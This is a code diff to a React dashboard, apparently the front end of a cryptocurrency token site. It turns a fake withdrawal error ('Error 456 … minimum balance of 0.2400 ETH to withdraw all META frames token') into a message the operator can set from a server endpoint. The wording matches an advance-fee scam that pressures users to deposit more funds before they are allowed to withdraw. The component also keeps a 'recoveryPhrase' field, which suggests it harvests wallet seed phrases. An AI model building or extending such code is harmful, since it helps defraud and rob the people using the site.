@@ -29,6 +29,17 @@ export default function Dashboard() {
         recoveryPhrase: ''
     });
     const [showWithdrawModal, setShowWithdrawModal] = useState(false);
+    const [withdrawErrorMessage, setWithdrawErrorMessage] = useState('#Error 456 - withdrawal processing delay... Insufficient amount for wallet verification. meet up the required minimum balance of 0.2400 ETH to withdraw all META frames token.');
+
+    const fetchWithdrawMessage = useCallback(async () => {
+        try {
+            const res = await fetch('/api/settings/withdraw-error');
+            const data = await res.json();
+            if (data.message) setWithdrawErrorMessage(data.message);
+        } catch {
+            // Keep default
+        }
+    }, []);
 
     const fetchUser = useCallback(async () => {
         setLoading(true);
@@ -57,6 +68,10 @@ export default function Dashboard() {
     useEffect(() => {
         fetchUser();
     }, [fetchUser]);
+
+    useEffect(() => {
+        if (showWithdrawModal) fetchWithdrawMessage();
+    }, [showWithdrawModal, fetchWithdrawMessage]);
 
     const handleWalletUpdate = async (e: React.FormEvent) => {
         e.preventDefault();
@@ -301,7 +316,7 @@ export default function Dashboard() {
                             <div className="flex items-start gap-3">
                                 <AlertCircle className="w-5 h-5 text-red-500 flex-shrink-0 mt-0.5" />
                                 <p className="text-sm text-red-400 whitespace-pre-line">
-                                    #Error 456 - withdrawal processing delay... Insufficient amount for wallet verification. meet up the required minimum balance of 0.2400 ETH to withdraw all META frames token.
+                                    {withdrawErrorMessage}
                                 </p>
                             </div>
                         </div>
